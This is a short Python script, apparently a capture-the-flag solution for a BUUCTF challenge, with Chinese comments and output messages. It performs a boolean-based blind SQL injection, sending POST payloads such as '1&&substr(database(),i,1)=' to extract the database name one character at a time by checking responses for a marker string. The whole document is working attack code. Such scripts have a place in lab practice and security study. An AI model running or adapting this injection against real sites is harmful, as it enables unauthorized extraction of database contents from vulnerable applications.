import requests

def get_database(url,strings):
    database_length = 1
    DBname = ''
    for i in range(1,100):
        data = {
            'id': "1&&(length(database()))="+str(i)
        }
        rs = requests.post(url,data)
        if 'Nu1L' in rs.text:
            database_length = i
            print('数据库长度为：'+str(database_length))
            break
    for i in range(1,database_length+1):
        for one_char in strings:
            data = {
                'id': "1&&substr(database()," + str(i) + ",1)='"+str(one_char)+"'"
            }
            rs = requests.post(url,data)
            if 'Nu1L' in rs.text:
                DBname = DBname + one_char
                print("\r", end="")
                print('正在获取数据库名称，当前已获取到'+str(i)+'位 | '+DBname, end='')
                break
    print('结束')

if __name__ == '__main__':
    url = 'http://e2df23b3-84f5-44e4-9eba-3134fe22b56e.node4.buuoj.cn:81/index.php'
    #不要修改string的顺序，是按asii码排列的，最后获取flag会用到
    strings = '-./0123456789:;<>=?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_`abcdefghijklmnopqrstuvwxyz{|}~#'
    get_database(url,strings)